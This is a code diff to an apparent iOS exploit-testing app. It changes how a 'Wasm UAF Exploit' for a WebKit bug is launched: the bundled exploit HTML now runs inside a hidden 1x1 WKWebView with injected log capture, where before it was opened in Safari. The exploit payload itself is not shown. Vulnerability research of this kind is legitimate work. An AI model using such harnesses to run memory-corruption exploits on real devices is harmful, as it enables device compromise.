@@ -7,6 +7,7 @@
 
 #import "ViewController.h"
 #import <dlfcn.h>
+#import <WebKit/WebKit.h>
 #import <IOKit/IOKitLib.h>
 #import <mach/mach.h>
 #import <mach/mach_error.h>
@@ -203,7 +204,7 @@ static const char kOpenPropertiesGarbage[] =
 
 // ---------- ViewController ----------
 
-@interface ViewController () {
+@interface ViewController () <WKScriptMessageHandler> {
     io_connect_t _persistedConnection;
     io_service_t _persistedService;
 }
@@ -847,7 +848,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *wasmConf = [UIButtonConfiguration filledButtonConfiguration];
     wasmConf.baseBackgroundColor = [UIColor systemGreenColor];
     self.wasmUafButton.configuration = wasmConf;
-    [self.wasmUafButton setTitle:@"Wasm UAF Exploit (v93)" forState:UIControlStateNormal];
+    [self.wasmUafButton setTitle:@"Wasm UAF Exploit (v94)" forState:UIControlStateNormal];
     [self.wasmUafButton addTarget:self action:@selector(wasmUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.wasmUafButton];
 
@@ -9041,33 +9042,53 @@ static void sigsys_handler(int sig) { atomic_store(&g_sigsys_fired, true); }
 }
 
 - (void)wasmUafTapped {
-    [self appendLog:@"\n=== Wasm UAF Exploit (Bug 306136) ==="];
-    [self appendLog:@"Opening in Safari — check console via Web Inspector"];
-
-    // Load exploit HTML in Safari via URL scheme
-    // The HTML file is bundled in the app, we serve it or open directly
+    // Read exploit HTML from bundle and run in WKWebView
     NSString *htmlPath = [[NSBundle mainBundle] pathForResource:@"wasm_uaf_exploit" ofType:@"html"];
+    NSString *html = nil;
     if (htmlPath) {
-        // Copy to temp and open
-        NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"wasm_uaf.html"];
-        [[NSFileManager defaultManager] removeItemAtPath:tmpPath error:nil];
-        [[NSFileManager defaultManager] copyItemAtPath:htmlPath toPath:tmpPath error:nil];
+        html = [NSString stringWithContentsOfFile:htmlPath encoding:NSUTF8StringEncoding error:nil];
+    }
+    if (!html) {
+        // Fallback: get from repo raw URL
+        [self appendLog:@"HTML not in bundle — add wasm_uaf_exploit.html to Xcode project"];
+        return;
+    }
 
-        NSURL *url = [NSURL fileURLWithPath:tmpPath];
-        [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:^(BOOL ok) {
-            dispatch_async(dispatch_get_main_queue(), ^{
-                if (ok) {
-                    [self appendLog:@"Opened in Safari — check Web Inspector console"];
-                    [self appendLog:@"Plug into Mac, open Safari → Develop → iPhone → wasm_uaf.html"];
-                } else {
-                    [self appendLog:@"Failed to open Safari — use self-hosted server"];
-                }
-            });
-        }];
-    } else {
-        [self appendLog:@"wasm_uaf_exploit.html not in bundle"];
-        [self appendLog:@"Host it manually: python3 -m http.server 8080"];
-        [self appendLog:@"Then open http://<iphone-ip>:8080/wasm_uaf_exploit.html in Safari"];
+    // Inject log capture into HTML
+    NSString *injected = [html stringByReplacingOccurrencesOfString:
+        @"LOG.textContent += msg + '\\n';"
+        withString:
+        @"LOG.textContent += msg + '\\n';"
+        @"window.webkit.messageHandlers.log.postMessage(msg);"];
+
+    [self appendLog:@"\n=== Wasm UAF Exploit (Bug 306136) ==="];
+
+    // Create WKWebView configuration with script message handler
+    WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
+    WKUserContentController *ucc = [[WKUserContentController alloc] init];
+    [ucc addScriptMessageHandler:self name:@"log"];
+    config.userContentController = ucc;
+
+    // Small webview just for execution
+    WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectMake(0,0,1,1) configuration:config];
+    wv.hidden = YES;
+    [self.view addSubview:wv];
+
+    // Also add a visible log area
+    __weak typeof(self) weakSelf = self;
+    self.wasmLog = [NSMutableString string];
+
+    [wv loadHTMLString:injected baseURL:nil];
+    [self appendLog:@"WKWebView loaded — waiting for exploit output..."];
+}
+
+// WKScriptMessageHandler
+- (void)userContentController:(WKUserContentController *)ucc didReceiveScriptMessage:(WKScriptMessage *)msg {
+    if ([msg.name isEqualToString:@"log"]) {
+        NSString *body = [NSString stringWithFormat:@"%@", msg.body];
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [self appendLog:[NSString stringWithFormat:@"[JS] %@", body]];
+        });
     }
 }
 
